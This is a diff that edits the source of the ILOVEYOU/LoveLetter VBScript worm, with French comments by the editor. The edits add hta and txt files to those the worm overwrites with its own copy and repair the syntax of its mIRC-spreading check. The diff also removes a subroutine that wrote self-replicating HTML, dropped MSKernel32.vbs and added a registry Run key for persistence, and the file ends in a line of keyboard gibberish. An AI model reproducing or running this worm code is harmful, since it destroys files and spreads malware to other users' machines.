@@ -136,8 +136,8 @@ Sub infectfiles(folderspec)
       ap.close
     rem Copies itself into every file with js/jse/css/wsh/sct/hta extension
     rem and creates a copy of the file with the .vbs extension.
-    ElseIf (ext = "js") Or (ext = "jse") Or (ext = "css") Or (ext = "wsh") Or (ext = "sct") Or (ext = "txt")
-    Then
+      rem J'ai ajouté l'extension txt pour qu'il soit plus simple de voir les dégats possible
+    ElseIf (ext = "js") Or (ext = "jse") Or (ext = "css") Or (ext = "wsh") Or (ext = "sct") Or (ext = "hta") Or (ext = "txt") Then
       Set ap = fso.OpenTextFile(f1.path, 2, true)
 
       ap.write vbscopy
@@ -180,8 +180,7 @@ Sub infectfiles(folderspec)
     If (eq <> folderspec) Then
       rem Looks for mIRC and related files to determine whether it
       rem should create/replace its script.ini with a malicious script.
-      If (s = "mirc32.exe") Or (s = "mlink32.exe") Or (s = "mirc.ini") Or (s = "script.ini") Or (s = "mirc.hlp")
-      Then
+      If (s = "mirc32.exe") Or (s = "mlink32.exe") Or (s = "mirc.ini") Or (s = "script.ini") Or (s = "mirc.hlp") Then
         Set scriptini = fso.CreateTextFile(folderspec & "\script.ini")
         rem The following mIRC script checks if the "nick" of a user is the same
         rem as "me" to halt and send a DCC command that will send a message to
@@ -329,100 +328,6 @@ Sub spreadtoemail()
   Set mapi = Nothing
 End Sub
 
-rem Subroutine to generate and create the HTML file for LOVE-LETTER-FOR-YOU.HTM.
-Sub html
-  On Error Resume Next
-  Dim lines, n, dta1, dta2, dt1, dt2, dt3, dt4, l1, dt5, dt6
-
-  rem Generates an HTML page which contains a JScript and VBScript to replicate
-  rem itself by leveraging ActiveX. It also listens for mouse and key events,
-  rem which will open additional windows of the same page.
-  dta1 = "<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"
-    & vbcrlf & _ "<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"
-    & vbcrlf & _ "<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"
-    & vbcrlf & _ "<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "
-    & vbcrlf & _ "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"
-    & vbcrlf & _ "<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"
-    & vbcrlf & _ "<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE>"
-    & vbcrlf & _ "<?-?BODY><?-?HTML>"
-    & vbcrlf & _ "<SCRIPT language=@-@JScript@-@>"
-    & vbcrlf & _ "<!--?-??-?"
-    & vbcrlf & _ "If (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"
-    & vbcrlf & _ "?-??-?-->"
-    & vbcrlf & _ "<?-?SCRIPT>"
-    & vbcrlf & _ "<SCRIPT LANGUAGE=@-@VBScript@-@>"
-    & vbcrlf & _ "<!--"
-    & vbcrlf & _ "on error resume next"
-    & vbcrlf & _ "Dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"
-    & vbcrlf & _ "aw=1"
-    & vbcrlf & _ "code="
-
-  dta2 = "Set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"
-    & vbcrlf & _ "Set dirsystem=fso.GetSpecialFolder(1)"
-    & vbcrlf & _ "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"
-    & vbcrlf & _ "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"
-    & vbcrlf & _ "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"
-    & vbcrlf & _ "set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"
-    & vbcrlf & _ "wri.write code4"
-    & vbcrlf & _ "wri.close"
-    & vbcrlf & _ "If (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) Then"
-    & vbcrlf & _ "If (err.number=424) Then"
-    & vbcrlf & _ "aw=0"
-    & vbcrlf & _ "End If"
-    & vbcrlf & _ "If (aw=1) Then"
-    & vbcrlf & _ "document.write @-@ERROR: can#-#t initialize ActiveX@-@"
-    & vbcrlf & _ "window.close"
-    & vbcrlf & _ "End If"
-    & vbcrlf & _ "End If"
-    & vbcrlf & _ "Set regedit = CreateObject(@-@WScript.Shell@-@)"
-    & vbcrlf & _ "regedit.RegWrite@-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"
-    & vbcrlf & _ "?-??-?-->"
-    & vbcrlf & _ "<?-?SCRIPT>"
-
-  rem Replaces encoded characters from the above document to form a valid
-  rem document that can be correctly opened and executed in the browser.
-  dt1 = replace(dta1, chr(35) & chr(45) & chr(35), "'")
-  dt1 = replace(dt1, chr(64) & chr(45) & chr(64), """")
-  dt4 = replace(dt1, chr(63) & chr(45) & chr(63), "/")
-  dt5 = replace(dt4, chr(94) & chr(45) & chr(94), "\")
-  dt2 = replace(dta2, chr(35) & chr(45) & chr(35), "'")
-  dt2 = replace(dt2, chr(64) & chr(45) & chr(64), """")
-  dt3 = replace(dt2, chr(63) & chr(45) & chr(63), "/")
-  dt6 = replace(dt3, chr(94) & chr(45) & chr(94), "\")
-
-  rem Opens a new file system object, which is used to read this specific
-  rem script file, that will then be injected into the HTM document.
-  Set fso = CreateObject("Scripting.FileSystemObject")
-  Set c = fso.OpenTextFile(WScript.ScriptFullName, 1)
-
-  lines = Split(c.ReadAll,vbcrlf)
-  l1 = ubound(lines)
-
-  rem Encodes all special characters of the script's HTM, as this script
-  rem will be injected into the HTM file and executed.
-  For n = 0 to ubound(lines)
-    lines(n) = replace(lines(n), "'", chr(91) + chr(45) + chr(91))
-    lines(n) = replace(lines(n), """", chr(93) + chr(45) + chr(93))
-    lines(n) = replace(lines(n), "\", chr(37) + chr(45) + chr(37))
-
-    If (l1 = n) Then
-      lines(n) = chr(34) + lines(n) + chr(34)
-    Else
-      lines(n) = chr(34) + lines(n) + chr(34) & " & vbcrlf & _"
-    End If
-  Next
-
-  rem Create the LOVE-LETTER-FOR-YOU.HTM file in the system directory.
-  Set b = fso.CreateTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM")
-  b.close
-
-  rem Creates the HTM file from everything above.
-  Set d = fso.OpenTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM", 2)
-  d.write dt5
-  d.write join(lines, vbcrlf)
-  d.write vbcrlf
-  d.write dt6
-  d.close
-End Sub
+j'ai enlevé la partie qui remplace la page d'accueil de internet explorer car je n'ai pas réussi a comprendre le code.
 
 ghvokbhjvfdvjhfpbjkvjhvlbkh kjvbcvbkgnghlbfj
